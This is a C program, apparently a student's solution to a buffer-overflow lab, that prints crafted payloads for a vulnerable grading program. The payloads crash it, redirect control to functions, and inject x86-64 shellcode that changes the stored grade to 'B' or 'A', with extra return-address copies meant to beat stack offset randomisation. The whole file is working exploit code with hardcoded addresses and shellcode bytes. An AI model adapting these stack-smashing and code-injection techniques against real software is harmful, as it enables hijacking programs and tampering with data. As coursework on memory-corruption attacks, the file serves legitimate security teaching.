/* 	Author info
 *	athimma Arjun Thimmareddy
 * 
 */
 
#include <stdio.h>
#include <malloc.h>
#include <string.h>


void triggerE(){
	/* Writing buf more than 36 characters to reach call to f(s) and overwrite with 0x00. This will try to make a call to location 0x00000000 which would cause Segfault */
	int i;
        char buf[76] = "Arjun\0";
	for(i = 6; i < 76; i++){
                buf[i] = (char) 0x00;
        }
        write(1,buf,76);
        fflush(stdout);
}

void triggerD(){
	/* Override buffer till call to f(s) and change the address to setGradeToD */
	int i;
	char buf[76] = "Arjun\0";
        for(i = 6; i < 71; i++){
                buf[i] = (char) 0x00;
        }
        buf[72] = (char) 0xb8;
        buf[73] = (char) 0x07;
        buf[74] = (char) 0x40;
        buf[75] = (char) 0x00;
        write(1,buf,76);
        fflush(stdout);
}

void triggerC(){
	/* Override the buffer till return address and change it to address of 'grade = C'*/
	int i;	
	char buf[124] = "Arjun\0";
        for(i = 6; i < 124; i++){
                buf[i] = (char) 0x00;
        }

	buf[72] = (char) 0x59;
        buf[73] = (char) 0x08;
        buf[74] = (char) 0x40;
        buf[75] = (char) 0x00;

        buf[120] = (char) 0x1e;
        buf[121] = (char) 0x08;
        buf[122] = (char) 0x40;
        buf[123] = (char) 0x00;
       
	write(1,buf,124);
        fflush(stdout);
}

void triggerB(){
	/* Override the buf so that when it gets stored to 'Name' it has instructions to make 'grade = B'. 
 * 	   Also change the return address to point the address in 'Name' where our instructions start */
        int i;
	/* Instructions - 
 * 	   movb     0x42, 0x600d84  // move 'B' to grade
 * 	   	   mov	    rax, 0x40081a   // return address of next instruction after readString call in main 
 * 	   	   	   jmp	    rax	            // jump to return address
 * 	   	   	   	*/
	char buf[124] = "Arjun\0\0""\xc6\x04\x25\x84\x0d\x60\x00\x42""\x48\xC7\xC0\x1a\x08\x40\x00""\xff\xe0";
        for(i = 24; i < 124; i++){
                buf[i] = (char) 0x00;
        }

	buf[72] = (char) 0x59;
        buf[73] = (char) 0x08;
        buf[74] = (char) 0x40;
        buf[75] = (char) 0x00;

        buf[120] = (char) 0xc7;
        buf[121] = (char) 0x0d;
        buf[122] = (char) 0x60;
        buf[123] = (char) 0x00;
        write(1, buf, 124);
        fflush(stdout);
}

void triggerA(){
	/* Override the buf so that when it gets stored to 'Name' it has instructions to make 'grade = A'. 
 * 	   Also change the return address to point the address in 'Name' where our instructions start.
 * 	   	   if 0 < r < 15, return address is pushed down 4 words.
 * 	   	   	   if 16 < r < 31, return address is pushed down    */
        int i;
	/* Instructions - 
 * 	   movb     0x41, 0x600d84  // move 'A' to grade
 * 	   	   mov	    rax, 0x40081a   // return address of next instruction cmp after readString call in main 
 * 	   	   	   jmp	    rax	            // jump to return address
 * 	   	   	   	*/ 
	char buf[1561] = "Arjun\0\0""\xc6\x04\x25\x84\x0d\x60\x00\x41""\x48\xC7\xC0\x1a\x08\x40\x00""\xff\xe0";
        for(i = 24; i < 156; ++i){
        	buf[i] = (char) 0x00;
        }
	/* return address when r = 0 */
        buf[72] = (char) 0x59;
        buf[73] = (char) 0x08;
        buf[74] = (char) 0x40;
        buf[75] = (char) 0x00;

        buf[120] = (char) 0xc7;
        buf[121] = (char) 0x0d;
        buf[122] = (char) 0x60;
        buf[123] = (char) 0x00;

	/* return address when 0 < r < 15 */
        buf[88] = (char) 0x59;
        buf[89] = (char) 0x08;
        buf[90] = (char) 0x40;
        buf[91] = (char) 0x00;

        buf[136] = (char) 0xc7;
        buf[137] = (char) 0x0d;
        buf[138] = (char) 0x60;
        buf[139] = (char) 0x00;

	/* return address when 16 < r < 31 */
        buf[104] = (char) 0x59;
        buf[105] = (char) 0x08;
        buf[106] = (char) 0x40;
        buf[107] = (char) 0x00;

        buf[152] = (char) 0xc7;
        buf[153] = (char) 0x0d;
        buf[154] = (char) 0x60;
        buf[155] = (char) 0x00;
        write(1,buf, 156);
        fflush(stdout);
}


void triggerS(){
	/* Override the buffer till return address and change it to address of 'grade = C'*/
        int i;	
	char buf[108] = "Arjun\0";
        for(i = 6; i < 108; i++){
                buf[i] = (char) 0x00;
        }
        buf[104] = (char) 0x73;
        buf[105] = (char) 0x29;
        buf[106] = (char) 0x40;
        buf[107] = (char) 0x00;
        write(1,buf,108);
        fflush(stdout);
}

int main(int argc, char *argv[])
{
        if(argc !=2) {
                printf("usage: ./trigger <a|b|c|d|e|s>");
                return 0;
        }
        switch(argv[1][0]) {
                case 'a': triggerA();
                         break;
                case 'b': triggerB();
                         break;
                case 'd': triggerD();
                         break;
                case 'e': triggerE();
                         break;
                case 'c': triggerC();
                         break;
                case 's': triggerS();
                         break;
                default: 
                        break;
        }
        return 0;
}
